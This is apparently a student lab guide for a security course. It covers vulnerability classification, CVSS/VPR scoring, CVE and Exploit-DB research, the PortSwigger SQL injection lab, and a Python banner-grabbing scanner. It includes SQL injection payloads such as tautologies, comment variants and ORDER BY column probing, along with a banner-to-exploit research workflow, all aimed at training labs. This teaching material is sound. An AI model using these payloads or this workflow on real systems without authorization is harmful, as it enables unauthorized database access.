# Lab Guide: Week 6 — Vulnerability Research & SQL Injection

---

## Part 1: Vulnerabilities 101 (TryHackMe)
### https://tryhackme.com/room/vulnerabilities101

**Time:** 2-3 hours | **Difficulty:** Beginner

---

### Task 2: Introduction to Vulnerabilities

**Key Classifications to Understand:**

| Type | Mechanism | Example |
|------|-----------|---------|
| **Operating System** | Bug in kernel or core service | EternalBlue (SMB) |
| **Application** | Bug in third-party software | Log4Shell (Log4j) |
| **Misconfiguration** | Insecure default setting | FTP Anonymous Access |
| **Injection** | Unsanitized input as executable code | SQL Injection |
| **Authentication Bypass** | Missing or weak access control | CVE-2022-1388 |

**Lab Exercise:** Identify the vulnerability type for each scenario given in the task.

---

### Task 3: CVSS & VPR Scoring

**CVSS Practice Exercise:**

Given a vulnerability with these properties, calculate severity:
```
Attack Vector: Network (remotely exploitable)
Attack Complexity: Low (no special conditions)
Privileges Required: None (no login needed)
User Interaction: None (victim does nothing)
Scope: Changed (impacts adjacent systems)
Confidentiality Impact: High
Integrity Impact: High
Availability Impact: High

Expected CVSS: ~9.8 - 10.0 (Critical)
```

**VPR Context Questions:**
1. If a CVSS 8.5 CVE has zero public PoC, what is the likely VPR? → Lower (2-4)
2. If a CVSS 6.5 CVE has a Metasploit module used by ransomware, what VPR? → Higher (8-9)
3. Which do you patch first: CVSS 9.0 / VPR 3.0, or CVSS 6.5 / VPR 9.5? → VPR 9.5

---

### Task 4: Vulnerability Databases

**Hands-On: Search NVD for a Real CVE**

```
1. Go to: https://nvd.nist.gov/vuln/search
2. Search: "vsftpd 3.0.3"
3. Record: All CVEs listed
4. Note: CVSS score, description, affected versions

5. Search: "Apache httpd 2.4.41"
6. Record: Top 3 highest CVSS CVEs
7. Note: Which are exploitable remotely without auth?
```

**Exercise: Exploit-DB Search**

```
1. Go to: https://www.exploit-db.com/
2. Search: "vsftpd"
3. Identify: Any working exploits for 3.0.3?
4. Search: "apache 2.4"
5. Filter: Verified exploits only
6. Record: CVE IDs and exploit types found
```

---

### Task 5: Finding a Vulnerability (Example Walkthrough)

**Process to follow:**

```
Step 1: Identify software running
  → From banner: vsftpd 3.0.3

Step 2: Search NVD
  → "vsftpd 3.0.3"
  → Look for CVEs with Network vector

Step 3: Check CVSS
  → Score ≥ 7.0 = High priority
  → Score 9.0+ = Critical, test first

Step 4: Check Exploit-DB
  → Is there working PoC code?
  → Is there Metasploit module?

Step 5: Verify version match
  → CVE affects vsftpd 2.3.4 only? → Not applicable
  → CVE affects vsftpd ≤ 3.0.5? → Applicable

Step 6: Document finding
  → CVE ID, CVSS, description, remediation
```

---

### Task 6: Exploiting Ackme's Application

**Methodology:**

1. Access the Ackme application
2. Identify the technology stack (look for version disclosures in headers)
3. Navigate to the CVE database with the version string
4. Find applicable CVE with high exploitability
5. Exploit the identified parameter
6. Verify unauthorized data access

**Document your findings:**

```
Application: Ackme Corporate Panel
Technology: [identified stack]
Version: [identified version]
CVE Found: CVE-[YEAR]-[ID]
CVSS: [Score]
Exploit Type: [Type]
Payload Used: [Payload]
Data Accessed: [What was visible]
```

---

## Part 2: PortSwigger SQL Injection Lab
### https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

**Time:** 30-45 minutes | **Difficulty:** Apprentice | **Tool:** Burp Suite

---

### Setup: Burp Suite Configuration

```
1. Open Burp Suite Community
2. Proxy → Intercept → ON
3. Browser → Proxy settings → 127.0.0.1:8080
4. Or use Burp Suite's built-in Chromium browser
5. Navigate to lab URL
```

---

### Step-by-Step Exploitation

**Step 1: Intercept Normal Request**
```
1. Click any product category (e.g., "Accessories")
2. Burp Suite intercepts the GET request
3. Observe: GET /filter?category=Accessories HTTP/2
4. Forward the request (note normal behavior)
```

**Step 2: Craft Injection**
```
Right-click → Send to Repeater
In Repeater, modify category parameter:
  FROM: category=Accessories
  TO:   category=Accessories'+OR+1=1--

Send request
```

**Step 3: Verify Exploit**
```
Observe response body:
  - More products than normal? ✓ Injection worked
  - Products without "Buy Now" buttons? → Unreleased items
  - Lab banner visible? → Confirmed solved
```

**Step 4: Understand the URL Encoding**
```
Original payload: Accessories' OR 1=1--
URL encoded:      Accessories%27+OR+1%3D1--

Encoding table:
' → %27
= → %3D
(space) → + or %20
```

---

### SQL Injection Practice: Additional Test Payloads

After solving the lab, practice these to understand SQLi depth:

**Test 1: Confirm injection with error**
```
Accessories'
→ Expected: SQL syntax error (confirms vulnerable)
```

**Test 2: Comment styles**
```
Test 2: Comment styles

Accessories'+OR+1=1--    (Standard SQL - Note: Requires a space after -- in MSSQL/MySQL)
Accessories'+OR+1=1#     (MySQL specific inline comment)
Accessories'+OR+1=1/* (Note: Unclosed /* causes syntax errors in most DBs, avoid as a trailing comment)

```

**Test 3: String tautology alternative**
```
'+OR+'a'='a'--
→ OR condition: 'a'='a' is always true (same effect as 1=1)
```

**Test 4: Verify column count (next step in real engagement)**
```
'+ORDER+BY+1--    (no error = 1 column exists)
'+ORDER+BY+2--    (no error = 2 columns exist)
'+ORDER+BY+3--    (error = only 2 columns in SELECT)
```

---

## Part 3: Python Banner Grabbing Scanner

**File:** `banner-grabbing-scanner.py`

### Running the Scanner

```bash
# With target as argument
python3 banner-grabbing-scanner.py 10.48.134.77

# Default (uses placeholder x.x.x.x, edit in code)
python3 banner-grabbing-scanner.py
```

### Expected Output

```
-----------------------------------------------------------------
[*] Target Locked: 10.48.134.77
[*] Starting Multi-Threaded Banner Grabbing Scanner...
-----------------------------------------------------------------
[+] Port 21   /tcp OPEN   | [BANNER: 220 (vsftpd 3.0.3)]
[+] Port 22   /tcp OPEN   | [BANNER: SSH-2.0-OpenSSH_7.4]
[+] Port 8080 /tcp OPEN   | [BANNER: Server: Apache Tomcat/9.0.41 (Java)]
[+] Port 443  /tcp OPEN   | [BANNER: Open (Banner grab timed out)]
-----------------------------------------------------------------
[*] Scan Completed!
```

### Using Banner Output for CVE Research

```
Banner received: 220 (vsFTPd 3.0.3)
                 ↓
Extract version: vsftpd 3.0.3
                 ↓
NVD search:      "vsftpd 3.0.3"
                 ↓
Find CVEs:       CVE-XXXX-XXXXX (CVSS 7.5)
                 ↓
Check Exploit-DB: searchsploit vsftpd 3.0.3
                 ↓
Exploit selection: Network vector + No-auth required → test first
```

---

## Engineering Notes: Banner Grabbing vs Week 5 Scanner

### Design Differences

| Aspect | Week 5 Scanner | Week 6 Banner Grabber |
|--------|---------------|----------------------|
| **Architecture** | Queue-based (4 thread pool) | Thread-per-port (10 threads) |
| **Suitable for** | Large port ranges (100-65535) | Small fixed port lists (≤20) |
| **Output** | Port + state + service name | Port + state + actual banner |
| **Intelligence** | Port open/closed | Software name + version |
| **CVE research** | Not applicable | Direct (version string ready) |

### When to Use Each Scanner

```
Use banner-grabbing-scanner.py when:
  - Small fixed port list (well-known ports)
  - Need software versions for CVE research
  - Quick targeted assessment

Use simple-port-scanner.py (Week 5) when:
  - Large port range (500-65535 ports)
  - Just need open/closed status
  - Speed and thread control matter
```

---

**Status:** Week 6 Lab Guide | All Exercises Included | Ready for Practice
